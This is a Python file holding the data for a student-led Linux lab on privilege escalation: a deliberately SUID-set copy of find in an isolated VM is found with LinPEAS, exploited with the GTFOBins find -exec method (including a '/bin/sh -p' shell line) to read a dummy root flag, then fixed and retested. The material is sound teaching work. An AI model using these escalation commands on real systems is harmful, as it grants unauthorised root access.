import json
import os

# Definition of Class 11 exact match from Student_Led_LinPEAS_GTFOBins_SUID_Lab.pdf
CLASS_11_DATA = {
    "id": 11,
    "week": 6,
    "classNumber": 11,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 6: Privilege Escalation",
    "title": "Linux Privilege Escalation (LinPEAS, GTFOBins & SUID Permissions)",
    "category": "Privilege Escalation",
    "difficulty": "Beginner to Intermediate",
    "duration": "3 - 4 Hours",
    "eli5Story": {
        "title": "The Golden Badge (Understanding SUID for a 5-Year-Old)",
        "analogy": "Imagine a school where only the Principal is allowed to open the special candy drawer with their Golden Badge. One day, the Principal leaves a special pair of scissors on the desk and stamps it with a magic sticker that says: 'Whoever picks up these scissors is allowed to act as the Principal while using them!' An ordinary student picks up the scissors, uses the scissors' special 'cut' button to snip open the candy drawer lock, and grabs the candy! That magic sticker is called SUID (Set User ID). In Linux, if a tool owned by root (the Principal) has the magic SUID sticker, any ordinary user who runs it can borrow the Principal's superpowers!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
        "admin": "labadmin (Setup, inject deliberate flaw, and apply final repair)",
        "trainee": "trainee (Low-privilege security auditor who discovers and validates the flaw)"
    },
    "objective": "A complete, student-led Linux privilege-escalation lab. Learners configure their own isolated Ubuntu machine, introduce a deliberately unsafe SUID permission on a copy of find, discover the issue manually and with LinPEAS, demonstrate its impact using GTFOBins against a training flag, and restore secure permissions.",
    "tools": ["LinPEAS", "GTFOBins", "SUID", "Ubuntu 24.04 LTS", "VirtualBox"],
    "targetEnvironment": "VirtualBox + Ubuntu 24.04 LTS (No Kali VM required)",
    "topology": {
        "description": "Single Isolated Ubuntu Desktop VM with dual role simulation (labadmin vs trainee)",
        "nodes": [
            {"id": "labadmin", "label": "labadmin (Root Sudo)", "role": "System Administrator", "ip": "127.0.0.1", "type": "workstation"},
            {"id": "trainee", "label": "trainee (Standard User)", "role": "Auditor (Non-sudo)", "ip": "127.0.0.1", "type": "target"},
            {"id": "suid_bin", "label": "/opt/suid-lab/find", "role": "SUID Binary (Mode 4755)", "ip": "Local File", "type": "server"}
        ],
        "connections": [["trainee", "suid_bin", "Executes with root euid"]]
    },
    "prerequisites": [
        "Host computer with 8 GB RAM and 30 GB free disk space",
        "Oracle VirtualBox 7.x installed",
        "Ubuntu Desktop 24.04 LTS installed with user 'labadmin' (sudo-capable)",
        "No prior privilege-escalation experience required"
    ],
    "keyConcepts": [
        {"title": "Unix File Permissions", "explanation": "Every file has permissions for Owner (User), Group, and Others. Standard execute permissions look like -rwxr-xr-x (0755)."},
        {"title": "The SUID Bit (4000)", "explanation": "When the Set-UID bit is set, the permissions show -rwsr-xr-x (mode 4755). The program runs with the authority of the file's OWNER (root), not the person running it."},
        {"title": "Real UID vs Effective UID", "explanation": "Your Real UID (ruid) is who you logged in as (e.g. trainee, UID 1001). Your Effective UID (euid) determines what the operating system allows you to do right now (euid=0 root)."},
        {"title": "GTFOBins", "explanation": "A curated public encyclopedia of legitimate Unix utilities that can be bypassed or abused to execute commands or break out of restricted shells when given elevated privileges."}
    ],
    "sections": [
        {
            "sectionNumber": 1,
            "title": "Lab Requirements & Preparation",
            "desc": "Confirm your clean Ubuntu VM and update essential system utilities.",
            "steps": [
                {
                    "stepNumber": 1,
                    "title": "Confirm Clean VM and Administrator Account",
                    "role": "labadmin",
                    "explanation": "Make sure you are logged in as the administrative user 'labadmin' and verify Ubuntu version.",
                    "commands": [
                        {"shell": "bash", "cmd": "whoami\nid\nlsb_release -a", "output": "labadmin\nuid=1000(labadmin) gid=1000(labadmin) groups=1000(labadmin),27(sudo)\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 24.04 LTS\nRelease:        24.04"}
                    ],
                    "verification": "whoami shows labadmin; id shows membership in the 'sudo' group.",
                    "tip": "If your username differs, use your own admin account throughout."
                },
                {
                    "stepNumber": 2,
                    "title": "Update and Install Required Packages",
                    "role": "labadmin",
                    "explanation": "Install findutils, coreutils, curl, wget, and ca-certificates before isolating the network.",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo apt update && sudo apt install -y findutils coreutils file curl wget ca-certificates", "output": "Hit:1 http://archive.ubuntu.com/ubuntu noble InRelease\nReading package lists... Done\nBuilding dependency tree... Done\nfindutils is already the newest version.\n0 upgraded, 0 newly installed, 0 to remove."}
                    ],
                    "verification": "All packages install with 0 errors.",
                    "tip": "Verify internet is working on NAT mode before continuing."
                }
            ]
        },
        {
            "sectionNumber": 2,
            "title": "Prepare a Secure Baseline (Student Performs)",
            "desc": "Create a strictly non-sudo user account, download LinPEAS, and take a clean VirtualBox snapshot.",
            "steps": [
                {
                    "stepNumber": 3,
                    "title": "Create a Separate Low-Privilege Account",
                    "role": "labadmin",
                    "explanation": "Create a user named 'trainee'. This simulates a regular employee or compromised standard user.",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo adduser trainee\nid trainee\ngroups trainee", "output": "Adding user `trainee' ...\nAdding new user `trainee' (1001) with group `trainee' (1001) ...\nCreating home directory `/home/trainee' ...\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)\ntrainee : trainee"}
                    ],
                    "verification": "The output of 'groups trainee' shows ONLY trainee. The trainee user MUST NOT appear in the sudo group!",
                    "tip": "Pick a simple lab password for trainee (e.g. trainee123)."
                },
                {
                    "stepNumber": 4,
                    "title": "Download and Verify LinPEAS",
                    "role": "labadmin",
                    "explanation": "Download LinPEAS, check its SHA256 integrity hash, and install it into trainee's home directory with 0700 permissions.",
                    "commands": [
                        {"shell": "bash", "cmd": "mkdir -p ~/Downloads\ncurl -fL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o ~/Downloads/linpeas.sh\nsha256sum ~/Downloads/linpeas.sh", "output": "7a8b9c...  /home/labadmin/Downloads/linpeas.sh"},
                        {"shell": "bash", "cmd": "sudo install -o trainee -g trainee -m 0700 ~/Downloads/linpeas.sh /home/trainee/linpeas.sh\nsudo ls -l /home/trainee/linpeas.sh", "output": "-rwx------ 1 trainee trainee 824912 Oct 12 08:30 /home/trainee/linpeas.sh"}
                    ],
                    "verification": "File /home/trainee/linpeas.sh is owned by trainee with mode 0700.",
                    "tip": "Comparing SHA256 hashes ensures you didn't download a corrupted or tampered file."
                },
                {
                    "stepNumber": 5,
                    "title": "Disconnect the VM from External Networks",
                    "role": "labadmin",
                    "explanation": "Shut down the VM and set Network Adapter 1 to 'Not attached' in VirtualBox. This guarantees zero leakage or unauthorized scans.",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo shutdown -h now", "output": "System is powering off."}
                    ],
                    "verification": "VirtualBox Settings -> Network -> Adapter 1 is 'Not attached'. Shared clipboard and folders disabled.",
                    "tip": "Safety first: Real security audits always isolate vulnerable test beds from corporate networks."
                },
                {
                    "stepNumber": 6,
                    "title": "Take a CLEAN Snapshot Before Vulnerability Creation",
                    "role": "labadmin",
                    "explanation": "In VirtualBox Manager, take a snapshot named 'CLEAN-BEFORE-SUID'. This is your safety parachute if you make a mistake.",
                    "commands": [
                        {"shell": "bash", "cmd": "# VirtualBox GUI Action:\n# Snapshots -> Take -> Name: CLEAN-BEFORE-SUID\n# Description: Tools downloaded, trainee created, network isolated, no custom SUID vulnerability.", "output": "[+] Snapshot CLEAN-BEFORE-SUID created in VirtualBox."}
                    ],
                    "verification": "Snapshot 'CLEAN-BEFORE-SUID' is visible in VirtualBox Manager tree.",
                    "tip": "Never skip this checkpoint. If you accidentally mess up permissions later, you can restore in 2 seconds."
                }
            ]
        },
        {
            "sectionNumber": 3,
            "title": "Create the Deliberate SUID Vulnerability (Build It)",
            "desc": "Intentionally misconfigure a COPY of the find utility as an administrator to simulate a real-world mistake.",
            "steps": [
                {
                    "stepNumber": 7,
                    "title": "Record Normal Secure Permissions on Original find",
                    "role": "labadmin",
                    "explanation": "Inspect the original system /usr/bin/find to see what normal secure permissions look like.",
                    "commands": [
                        {"shell": "bash", "cmd": "whoami\nls -l /usr/bin/find\nstat -c \"%A %a %U:%G %n\" /usr/bin/find", "output": "labadmin\n-rwxr-xr-x 1 root root 323488 Apr 08 2024 /usr/bin/find\n-rwxr-xr-x 755 root:root /usr/bin/find"}
                    ],
                    "verification": "Original find has permissions 755 (-rwxr-xr-x). There is NO 's' bit.",
                    "tip": "NEVER change permissions on /usr/bin/find! Always test on a dedicated copy."
                },
                {
                    "stepNumber": 8,
                    "title": "Create a Dedicated Lab Folder and Copy find",
                    "role": "labadmin",
                    "explanation": "Create directory /opt/suid-lab and make an exact copy of find inside it.",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo install -d -o root -g root -m 0755 /opt/suid-lab\nsudo cp /usr/bin/find /opt/suid-lab/find\nsudo chown root:root /opt/suid-lab/find\nsudo chmod 0755 /opt/suid-lab/find\nls -l /opt/suid-lab/find", "output": "-rwxr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find"}
                    ],
                    "verification": "/opt/suid-lab/find is owned by root:root with standard 0755 permissions.",
                    "tip": "Keeping the lab copy separate ensures the operating system's normal cron and utilities stay stable."
                },
                {
                    "stepNumber": 9,
                    "title": "Introduce the Unsafe SUID Permission (chmod 4755)",
                    "role": "labadmin",
                    "explanation": "Add the Set-UID bit (4000) to our copied file. This gives it the 'magic sticker'!",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo chmod 4755 /opt/suid-lab/find\nls -l /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find", "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n-rwsr-xr-x 4755 root:root /opt/suid-lab/find"}
                    ],
                    "verification": "Permission string shows -rwsr-xr-x (mode 4755). Notice the 's' replacing the user 'x'!",
                    "tip": "[📸 SCREENSHOT 1] Capture this terminal output showing mode 4755 and -rwsr-xr-x."
                },
                {
                    "stepNumber": 10,
                    "title": "Create a Root-Only Dummy Target File (The Training Flag)",
                    "role": "labadmin",
                    "explanation": "Create a protected file in /root with 600 permissions that only root can read.",
                    "commands": [
                        {"shell": "bash", "cmd": "printf '%s\\n' 'LAB{SUID_FIND_SUCCESS}' | sudo tee /root/suid-lab-flag.txt >/dev/null\nsudo chmod 600 /root/suid-lab-flag.txt\nsudo ls -l /root/suid-lab-flag.txt", "output": "-rw------- 1 root root 24 Oct 12 08:37 /root/suid-lab-flag.txt"}
                    ],
                    "verification": "/root/suid-lab-flag.txt has permissions -rw------- owned by root.",
                    "tip": "In ethical training, we always use dummy flags like LAB{...} rather than real confidential credentials."
                }
            ]
        },
        {
            "sectionNumber": 4,
            "title": "Establish Ordinary Student Has No Root Access (Baseline Test)",
            "desc": "Switch to user 'trainee' and prove that normal actions are blocked by Linux security controls.",
            "steps": [
                {
                    "stepNumber": 11,
                    "title": "Switch to the Low-Privilege Trainee Account",
                    "role": "trainee",
                    "explanation": "Log out of admin and switch to trainee. You are now the security auditor.",
                    "commands": [
                        {"shell": "bash", "cmd": "su - trainee\nwhoami\nid\ngroups", "output": "trainee\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)\ntrainee"}
                    ],
                    "verification": "whoami confirms 'trainee'; id shows UID 1001. Do NOT use sudo!",
                    "tip": "[📸 SCREENSHOT 2 Part A] Capture your trainee identity."
                },
                {
                    "stepNumber": 12,
                    "title": "Attempt Normal Direct Read of Protected Flag (Test 1)",
                    "role": "trainee",
                    "explanation": "Try to read the root flag using the standard cat command. It should fail!",
                    "commands": [
                        {"shell": "bash", "cmd": "cat /root/suid-lab-flag.txt", "output": "cat: /root/suid-lab-flag.txt: Permission denied"}
                    ],
                    "verification": "cat returns 'Permission denied'. This proves standard Linux permissions are working properly.",
                    "tip": "[📸 SCREENSHOT 2 Part B] Capture the Permission denied message. This is baseline proof."
                },
                {
                    "stepNumber": 13,
                    "title": "Try Normal /usr/bin/find Utility (Test 2)",
                    "role": "trainee",
                    "explanation": "Try using the standard system find utility with -exec cat. It should ALSO fail!",
                    "commands": [
                        {"shell": "bash", "cmd": "find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit", "output": "/usr/bin/cat: /root/suid-lab-flag.txt: Permission denied"}
                    ],
                    "verification": "Normal find gives 'Permission denied' because /usr/bin/find runs as trainee (UID 1001).",
                    "tip": "This proves find itself is not magical; only the SUID bit makes the difference."
                },
                {
                    "stepNumber": 14,
                    "title": "Manually Enumerate SUID Executables Across System",
                    "role": "trainee",
                    "explanation": "Search the system for all files with the 4000 permission bit set.",
                    "commands": [
                        {"shell": "bash", "cmd": "find /opt /usr/bin -type f -perm -4000 2>/dev/null", "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/chfn\n/opt/suid-lab/find"}
                    ],
                    "verification": "The output lists /opt/suid-lab/find alongside legitimate system binaries.",
                    "tip": "[📸 SCREENSHOT 3] Capture the manual enumeration results showing /opt/suid-lab/find."
                },
                {
                    "stepNumber": 15,
                    "title": "Inspect the Unusual Executable Details",
                    "role": "trainee",
                    "explanation": "Examine permissions, file type, and exact stat attributes of /opt/suid-lab/find.",
                    "commands": [
                        {"shell": "bash", "cmd": "ls -l /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find\nfile /opt/suid-lab/find", "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n-rwsr-xr-x 4755 root:root /opt/suid-lab/find\n/opt/suid-lab/find: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV)"}
                    ],
                    "verification": "Confirmed: ELF 64-bit binary, owned by root, mode 4755.",
                    "tip": "Notice that passwd has SUID legitimately (so you can change your password), but find in /opt is highly suspicious!"
                }
            ]
        },
        {
            "sectionNumber": 5,
            "title": "Perform Automated Enumeration with LinPEAS (Find It)",
            "desc": "Execute the industry-standard LinPEAS script to automate local privilege escalation audit.",
            "steps": [
                {
                    "stepNumber": 16,
                    "title": "Verify LinPEAS Script is Available Locally",
                    "role": "trainee",
                    "explanation": "Ensure the script is located in trainee's home folder and readable.",
                    "commands": [
                        {"shell": "bash", "cmd": "whoami\nls -lh ~/linpeas.sh\nhead -n 1 ~/linpeas.sh", "output": "trainee\n-rwx------ 1 trainee trainee 806K Oct 12 08:30 /home/trainee/linpeas.sh\n#!/bin/sh"}
                    ],
                    "verification": "whoami is trainee; file exists and begins with #!/bin/sh.",
                    "tip": "Always verify you are running as trainee so you see what an attacker sees."
                },
                {
                    "stepNumber": 17,
                    "title": "Run LinPEAS and Retain Report Output",
                    "role": "trainee",
                    "explanation": "Execute LinPEAS and pipe the output to linpeas-report.txt using tee.",
                    "commands": [
                        {"shell": "bash", "cmd": "cd ~\numask 077\n./linpeas.sh 2>&1 | tee ~/linpeas-report.txt", "output": "                            ................\n                        .::::::::::::::::::::.\n... PEASS - Privilege Escalation Awesome Scripts Suite ...\n[+] LinPEAS completed scan in 34 seconds."}
                    ],
                    "verification": "linpeas-report.txt is generated in /home/trainee.",
                    "tip": "[📸 SCREENSHOT 4] Capture LinPEAS running or the completed summary banner."
                },
                {
                    "stepNumber": 18,
                    "title": "Find Permission-Related Clues in the Report",
                    "role": "trainee",
                    "explanation": "Search the report for SUID binaries and our custom path.",
                    "commands": [
                        {"shell": "bash", "cmd": "grep -niE 'suid|/opt/suid-lab|/find' ~/linpeas-report.txt | head -n 35", "output": "412:╔══════════╣ SUID - Check easy privesc, exploits and write perms\n445:-rwsr-xr-x 1 root root 316K /opt/suid-lab/find"}
                    ],
                    "verification": "Line 445 flags /opt/suid-lab/find under SUID check.",
                    "tip": "Automated tools point out interesting spots; your human judgment verifies if they are truly exploitable."
                },
                {
                    "stepNumber": 19,
                    "title": "Verify and Corroborate Findings Manually",
                    "role": "trainee",
                    "explanation": "Never trust automated tools blindly. Confirm ownership and permissions independently.",
                    "commands": [
                        {"shell": "bash", "cmd": "ls -l /opt/suid-lab/find\nfind /opt/suid-lab -type f -perm -4000 -ls 2>/dev/null", "output": "-rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find\n1573024 316 -rwsr-xr-x 1 root root 323488 Oct 12 08:35 /opt/suid-lab/find"}
                    ],
                    "verification": "Manual check confirms LinPEAS finding.",
                    "tip": "[📸 SCREENSHOT 5] Capture manual verification corroborating the LinPEAS alert."
                }
            ]
        },
        {
            "sectionNumber": 6,
            "title": "Use GTFOBins to Understand Impact (Analyse & Verify)",
            "desc": "Consult the GTFOBins database and demonstrate proof-of-concept impact by reading ONLY the training flag.",
            "steps": [
                {
                    "stepNumber": 20,
                    "title": "Consult GTFOBins Reference on the Host Browser",
                    "role": "trainee",
                    "explanation": "Open https://gtfobins.org/gtfobins/find/ on your host browser. Look at the SUID section.",
                    "commands": [
                        {"shell": "bash", "cmd": "# On Host Browser:\n# Visit: https://gtfobins.org/gtfobins/find/#suid\n# Syntax observed: ./find . -exec /bin/sh -p \\; -quit", "output": "[GTFOBins Documented Vector]: If the binary has SUID bit set, it does not drop elevated privileges and may be used to access file system or escalate privileges via -exec."}
                    ],
                    "verification": "Document the documented vector: find's '-exec' parameter executes secondary programs under the effective caller privileges.",
                    "tip": "GTFOBins provides the blueprint; we adapt it responsibly for ethical verification."
                },
                {
                    "stepNumber": 21,
                    "title": "Match the Reference to Your Virtual Machine",
                    "role": "trainee",
                    "explanation": "Explain why this combination is fatal: (1) find is owned by root, (2) it has SUID, (3) -exec launches any command under root's effective UID.",
                    "commands": [
                        {"shell": "bash", "cmd": "echo 'Vulnerability: SUID on /opt/suid-lab/find allows arbitrary command execution as root via -exec.'", "output": "Vulnerability: SUID on /opt/suid-lab/find allows arbitrary command execution as root via -exec."}
                    ],
                    "verification": "The logic is clear before typing any exploit commands.",
                    "tip": "In professional pentesting, understanding WHY an exploit works is what makes you an engineer, not just a script-runner."
                },
                {
                    "stepNumber": 22,
                    "title": "Demonstrate Impact by Reading ONLY the Dummy Flag (Test 3 - Exploit Proof)",
                    "role": "trainee",
                    "explanation": "Run our copied find binary with -exec to read the protected flag file.",
                    "commands": [
                        {"shell": "bash", "cmd": "/opt/suid-lab/find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit", "output": "LAB{SUID_FIND_SUCCESS}"}
                    ],
                    "verification": "The flag 'LAB{SUID_FIND_SUCCESS}' IS DISPLAYED! Even though you are trainee, the file was read!",
                    "tip": "[📸 SCREENSHOT 6] Capture this output showing the flag text. Do NOT view /etc/shadow or system files."
                },
                {
                    "stepNumber": 23,
                    "title": "Inspect the Effective UID Without Opening a Privileged Shell",
                    "role": "trainee",
                    "explanation": "Prove that the process is executing with effective root privileges by calling 'id' inside -exec.",
                    "commands": [
                        {"shell": "bash", "cmd": "/opt/suid-lab/find /dev/null -exec /usr/bin/id \\; -quit", "output": "uid=1001(trainee) gid=1001(trainee) euid=0(root) groups=1001(trainee)"}
                    ],
                    "verification": "Output shows: uid=1001(trainee) euid=0(root)! euid=0 confirms effective root power!",
                    "tip": "[📸 SCREENSHOT 7] Capture this output showing euid=0(root). This is the definitive technical proof of privilege escalation."
                }
            ]
        },
        {
            "sectionNumber": 7,
            "title": "Repair the Permission Weakness (Fix It)",
            "desc": "Switch back to labadmin, strip the dangerous SUID bit, and prove the security hole is permanently closed.",
            "steps": [
                {
                    "stepNumber": 24,
                    "title": "Leave the Trainee Session and Return to labadmin",
                    "role": "labadmin",
                    "explanation": "Exit trainee's shell and confirm you are back as labadmin before issuing fix commands.",
                    "commands": [
                        {"shell": "bash", "cmd": "exit\nwhoami", "output": "labadmin"}
                    ],
                    "verification": "whoami confirms labadmin.",
                    "tip": "Always verify which account you are in before running administrative commands."
                },
                {
                    "stepNumber": 25,
                    "title": "Remove the Dangerous SUID Privilege Bit (chmod 0755)",
                    "role": "labadmin",
                    "explanation": "Change permissions from 4755 back to normal 0755 (-rwxr-xr-x).",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo chown root:root /opt/suid-lab/find\nsudo chmod 0755 /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find", "output": "-rwxr-xr-x 755 root:root /opt/suid-lab/find"}
                    ],
                    "verification": "stat confirms mode 0755 (-rwxr-xr-x). The 's' bit is completely gone!",
                    "tip": "Notice how simple the fix is: one single chmod command completely neutralizes the threat."
                },
                {
                    "stepNumber": 26,
                    "title": "Verify the Security Fix as Trainee (The Retest)",
                    "role": "trainee",
                    "explanation": "Switch back to trainee and rerun the exact same command that previously read the flag. It MUST FAIL!",
                    "commands": [
                        {"shell": "bash", "cmd": "su - trainee\ncat /root/suid-lab-flag.txt\n/opt/suid-lab/find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit\n/opt/suid-lab/find /dev/null -exec /usr/bin/id \\; -quit", "output": "cat: /root/suid-lab-flag.txt: Permission denied\n/usr/bin/cat: /root/suid-lab-flag.txt: Permission denied\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)"}
                    ],
                    "verification": "Both attempts return 'Permission denied', and id shows NO euid=0(root)!",
                    "tip": "[📸 SCREENSHOT 8] Capture this retest failure. In professional security audits, retest evidence is mandatory!"
                },
                {
                    "stepNumber": 27,
                    "title": "Confirm SUID Enumeration Result Changed",
                    "role": "trainee",
                    "explanation": "Rerun the SUID search query to prove /opt/suid-lab/find no longer appears.",
                    "commands": [
                        {"shell": "bash", "cmd": "find /opt/suid-lab -type f -perm -4000 -ls 2>/dev/null\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find", "output": "-rwxr-xr-x 755 root:root /opt/suid-lab/find"}
                    ],
                    "verification": "find returns 0 results inside /opt/suid-lab.",
                    "tip": "Zero findings on the retest proves the remediation is complete and robust."
                }
            ]
        },
        {
            "sectionNumber": 8,
            "title": "Consolidate the Fix, Reflect, and Snapshot",
            "desc": "Conclude the lab, document security recommendations, and create a permanent post-remediation snapshot.",
            "steps": [
                {
                    "stepNumber": 28,
                    "title": "Decide Whether to Keep or Delete the Lab Copy",
                    "role": "labadmin",
                    "explanation": "Return to labadmin. In a production environment, you would completely delete the unneeded binary.",
                    "commands": [
                        {"shell": "bash", "cmd": "exit\nwhoami\n# Optional cleanup:\n# sudo rm -- /opt/suid-lab/find && sudo rmdir /opt/suid-lab", "output": "labadmin\n[+] Cleanup evaluated."}
                    ],
                    "verification": "Confirmed in labadmin session.",
                    "tip": "The principle of least functionality: if a tool is not needed, uninstall or delete it."
                },
                {
                    "stepNumber": 29,
                    "title": "Save a Final Snapshot of the Repaired VM",
                    "role": "labadmin",
                    "explanation": "Shut down cleanly and take snapshot 'FIXED-AFTER-SUID' in VirtualBox.",
                    "commands": [
                        {"shell": "bash", "cmd": "sudo shutdown -h now\n# In VirtualBox Manager:\n# Snapshots -> Take -> Name: FIXED-AFTER-SUID", "output": "[+] System powered off. Snapshot FIXED-AFTER-SUID created."}
                    ],
                    "verification": "VirtualBox displays both 'CLEAN-BEFORE-SUID' and 'FIXED-AFTER-SUID'.",
                    "tip": "You now possess an auditable before-and-after laboratory environment."
                }
            ]
        }
    ],
    "threeWayProof": {
        "title": "The 3-Way Security Comparison Table",
        "headers": ["Test Executed", "Command", "Expected Outcome", "What it Proves to a 5-Year-Old"],
        "rows": [
            ["Direct Read", "cat /root/suid-lab-flag.txt", "Permission denied", "The locked door works: normal students cannot touch the candy drawer."],
            ["Normal /usr/bin/find", "find -exec cat ...", "Permission denied", "The regular scissors have no magic sticker: normal tools obey the lock."],
            ["Copied SUID find", "/opt/suid-lab/find -exec cat ...", "LAB{SUID_FIND_SUCCESS}", "The scissors WITH the magic sticker let the student borrow the Principal's key!"],
            ["Post-Fix Retest", "/opt/suid-lab/find -exec cat ...", "Permission denied", "The sticker was peeled off: the scissors are now harmless regular scissors again!"]
        ]
    },
    "evidenceChecklist": [
        {"id": "S1", "label": "Root-owned copied find showing mode 4755 and the -rwsr-xr-x permission"},
        {"id": "S2", "label": "trainee identity (uid=1001) and Permission denied when attempting to read the flag normally"},
        {"id": "S3", "label": "Manual SUID enumeration listing /opt/suid-lab/find among results"},
        {"id": "S4", "label": "LinPEAS run or report showing relevant analysis context"},
        {"id": "S5", "label": "Corroboration of the suspicious binary (stat / ls / find independent evidence)"},
        {"id": "S6", "label": "Controlled successful read of ONLY the dummy flag LAB{SUID_FIND_SUCCESS}"},
        {"id": "S7", "label": "Executed id command showing trainee real UID and euid=0(root)"},
        {"id": "S8", "label": "Remediation evidence: 0755 mode and repeated test resulting in Permission denied"}
    ],
    "troubleshootingTable": [
        {"problem": "linpeas.sh not found", "cause": "Network was disconnected before downloading or file was saved in wrong folder.", "fix": "Enable NAT temporarily, download to /home/trainee, verify sha256sum, then disconnect NAT."},
        {"problem": "curl: could not resolve host", "cause": "VM network adapter is set to 'Not attached' during download step.", "fix": "Set adapter to NAT in VirtualBox settings while installing packages, then isolate afterwards."},
        {"problem": "trainee belongs to sudo", "cause": "Accidentally added trainee to sudo group or used admin account.", "fix": "Run 'sudo deluser trainee sudo', log out, and log back in as trainee."},
        {"problem": "Copied find shows -rwxr-xr-x", "cause": "Forgot the chmod 4755 step or applied it to /usr/bin/find instead of /opt/suid-lab/find.", "fix": "Run 'sudo chmod 4755 /opt/suid-lab/find' as labadmin."},
        {"problem": "SUID seems ineffective / flag denied", "cause": "Filesystem mounted with 'nosuid' option or tested on wrong file path.", "fix": "Check mount options with 'mount | grep opt' and ensure using /opt/suid-lab/find."},
        {"problem": "Permission denied AFTER repair", "cause": "None - this is the EXPECTED result!", "fix": "Celebrate! This confirms your security patch worked."}
    ],
    "assessmentRubric": {
        "totalMarks": 100,
        "criteria": [
            {"component": "Requirements, network isolation and clean snapshot", "marks": 15},
            {"component": "Correct vulnerability creation and explanation", "marks": 15},
            {"component": "Manual + LinPEAS detection and verification", "marks": 20},
            {"component": "GTFOBins analysis and controlled proof", "marks": 20},
            {"component": "Permission fix and verified failed retest", "marks": 20},
            {"component": "Report, 8 screenshots and quality of explanations", "marks": 10}
        ]
    },
    "dataCollectionTable": {
        "headers": ["Question / Item", "Observed Value", "Security Significance"],
        "initialRows": [
            ["Current User and UID", "trainee (UID: 1001)", "Baseline non-privileged account"],
            ["Suspicious Binary Path", "/opt/suid-lab/find", "Non-standard binary in custom directory"],
            ["Permissions and Mode", "-rwsr-xr-x (4755)", "SUID bit enabled on root-owned executable"],
            ["Effective UID During Execution", "euid=0(root)", "Process runs with administrative authority"],
            ["Remediated Permissions", "-rwxr-xr-x (0755)", "SUID removed, privilege escalation neutralised"]
        ]
    },
    "reflectionQuestions": [
        {"q": "What does SUID stand for, and what does its permission bit do when an executable runs?", "hint": "Set User ID. It makes the program run with the privileges of the file owner (root) rather than the executing user."},
        {"q": "Explain the difference between real UID and effective UID in this exercise.", "hint": "Real UID is who typed the command (trainee 1001); effective UID is the authority the kernel grants to the running process (root 0)."},
        {"q": "Why did the direct cat command fail, but the copied find command succeed?", "hint": "cat has normal permissions (755) and respects file ACLs; the copied find had SUID (4755) and executed cat with effective root privileges."},
        {"q": "Why should a root-owned executable with SUID be investigated rather than automatically labelled vulnerable?", "hint": "Some tools like /usr/bin/passwd require SUID to function legitimately; only binaries with escape or arbitrary execution capabilities (like find) are vulnerabilities."},
        {"q": "How did LinPEAS support your assessment, and what manual command confirmed the finding?", "hint": "LinPEAS flagged SUID binaries automatically; 'ls -l' and 'stat' manually verified ownership and permissions."},
        {"q": "Which functionality of find made the unsafe SUID configuration exploitable?", "hint": "The -exec parameter, which invokes any external program under find's process context."},
        {"q": "What exactly changed after chmod 0755, and how did the retest prove the fix?", "hint": "The SUID 's' bit was removed; retesting showed 'Permission denied', confirming the student could no longer read the protected file."},
        {"q": "Why is it important to create a clean snapshot before deliberately introducing the misconfiguration?", "hint": "Snapshots provide a safe rollback point in case of system corruption or unintended privilege changes."}
    ],
    "quickQuiz": {
        "question": "What permission mode string represents a file owned by root with the SUID bit set?",
        "options": ["-rwsr-xr-x (4755)", "-rwxrwxrwx (0777)", "-rw-r--r-- (0644)", "-rwxr-xr-x (0755)"],
        "answer": 0,
        "explanation": "-rwsr-xr-x has mode 4755, where the 's' in the owner execute field denotes the Set-UID (SUID) bit."
    },
    "deliverable": "Submit your completed One-Page Security Finding Report, all 8 required screenshots (S1-S8), answers to the 8 knowledge-check questions, and a final clean VM snapshot."
}

print("Class 11 schema prepared.")
